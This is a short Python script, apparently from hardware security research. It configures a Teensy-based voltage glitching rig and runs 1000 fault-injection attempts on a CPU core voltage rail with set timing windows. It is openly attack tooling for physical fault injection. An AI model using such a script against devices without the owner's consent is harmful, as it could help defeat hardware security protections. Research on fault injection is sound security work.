# attack.py
import datetime

# for time-to-success
print(datetime.datetime.now())

import teensy

gs = teensy.GlitchSetup(
    # Use the serial port of your Teensy device
    teensy.TeensyClient("/dev/ttyACM0"),
    # inject glitches to the first voltage rail not the second
    use_core=True,
)

# Connect to the teensy and set some parameters
gs.start()

# For triggering a logic analyser (only capture successes)
gs.teensy.set("hw", "trigger_restart", "false")
gs.teensy.set("hw", "trigger_glitch", "false")
gs.teensy.set("hw", "trigger_glitch_broken", "false")
gs.teensy.set("hw", "trigger_glitch_running", "false")
gs.teensy.set("hw", "trigger_glitch_success", "true")
gs.teensy.set("hw", "trigger_attack", "false")
gs.teensy.set("hw", "trigger_cli", "false")
gs.teensy.set("hw", "trigger_restart", "false")

gs.attack_range(
    # perform 1000 attacks
    count=1000,
    # cs pulses to wait
    waits=29,
    # vid of the attack
    vid=0xA0,
    # sample the delay from the interval [delay_min, delay_max[
    delay_min=3108,
    delay_max=5104,
    # sample the duration from the interval [dur_min, dur_max[
    dur_min=920,
    dur_max=950,
)
